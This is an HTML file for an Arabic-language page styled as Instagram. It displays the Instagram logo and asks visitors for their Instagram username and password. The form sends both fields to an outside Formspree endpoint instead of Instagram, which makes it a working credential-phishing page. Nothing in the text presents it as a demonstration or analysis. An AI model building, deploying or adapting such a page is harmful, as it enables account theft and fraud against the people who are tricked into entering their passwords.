from instagram
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال معلومات إنستغرام</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            text-align: center;
            padding: 50px;
        }
        .form-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: auto;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #0077B5;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background-color: #005f80;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h2>إدخال معلوماتك الخاصة بحساب إنستغرام</h2>
        <form action="https://formspree.io/f/xeoapeqj" method="POST">
            <label for="username">اسم المستخدم</label>
            <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required>

            <label for="password">كلمة المرور</label>
            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>

            <button type="submit">إرسال</button>
        </form>
    </div>
</body>
</html>
